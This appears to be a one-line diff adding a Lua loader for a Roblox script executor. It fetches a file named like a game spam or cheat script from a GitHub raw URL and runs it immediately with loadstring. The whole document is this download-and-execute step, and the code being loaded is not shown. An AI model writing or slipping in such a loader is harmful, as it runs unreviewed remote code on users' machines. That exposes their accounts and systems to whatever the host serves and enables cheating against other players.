@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/fake-an-egg-spam7-fr6r77f3o5euwg.lua"))()
